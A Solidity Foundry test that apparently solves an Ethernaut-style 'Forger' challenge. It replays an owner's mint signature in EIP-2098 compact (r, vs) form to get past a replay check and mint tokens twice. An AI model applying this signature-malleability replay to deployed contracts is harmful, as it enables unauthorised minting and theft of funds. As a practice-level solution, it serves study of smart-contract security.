// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Forger.sol";

// ECDSA.tryRecover() of Openzeppelin's version v4.6.0 allows using (r, vs) instead of (r, s, v) for verification of the same signature content
// vs: use s that is min(n - s, s), with its leftmost bit ORed with (v - 27)
contract ForgerTest is Test {
    Forger instance;

    function setUp() public {
        instance = new Forger();
    }

    function test() public {
        bytes32 r = 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809;
        bytes32 s = 0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb;
        uint8 v = 28;

        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        instance.createNewTokensFromOwnerSignature(
            hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c",
            receiver,
            amount,
            salt,
            deadline
        );

        uint256 n = uint256(
            0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
        );
        uint256 s_uint = uint256(s);
        uint256 canonical_s = n - s_uint > s_uint ? s_uint : n - s_uint;
        bytes32 vs = bytes32(((uint256(v) - 27) << 255) | canonical_s);
        bytes memory signature2098 = abi.encodePacked(r, vs);

        instance.createNewTokensFromOwnerSignature(
            signature2098,
            receiver,
            amount,
            salt,
            deadline
        );

        assertEq(instance.totalSupply(), amount * 2);
    }
}
